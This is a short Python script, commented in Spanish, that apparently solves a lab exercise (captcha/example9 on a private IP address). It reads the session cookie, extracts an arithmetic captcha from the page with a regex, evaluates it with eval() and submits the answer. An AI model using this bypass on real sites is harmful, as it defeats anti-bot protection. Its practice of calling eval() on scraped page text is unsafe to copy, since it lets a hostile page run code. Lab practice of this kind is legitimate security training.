from urllib.error import *
from urllib.request import *
from urllib.parse import *
import subprocess
import urllib,  requests, re, os


print("[+] Descargando Pagina");  
site = urllib.request.urlopen("http://172.20.10.7/captcha/example9/")
global cookie
cookie = site.getheader('Set-Cookie')
print("-----Cookie extraida: " + cookie);
site_html = site.read().decode("utf-8")
#print(site_html)
global token
# Obtener el token (10 numeros + . + 7 numeros)
token = re.findall(r'(?:[0-9]|[0-9])+[\+\-\^\*]+(?:[0-9]|[0-9])', site_html)
print ("-----Token: " + token[0])
resultado=eval(token[0])
#print(resultado)
print("[+] Enviando peticion...");
print(resultado)
urlconcaptcha = "http://172.20.10.7/captcha/example9/submit?captcha="+str(resultado)+"&Submit+Query"
print("-----URL: " + urlconcaptcha);
request = urllib.request.Request(urlconcaptcha,headers={'Cookie':cookie})
f = urlopen(request)
response = f.read().decode('utf-8')
#print(response)
exito = re.search('Success', response)
if exito:
    print("-----Conseguido!")
else:
    print ("-----Fallo!")

print("[+] Fin!");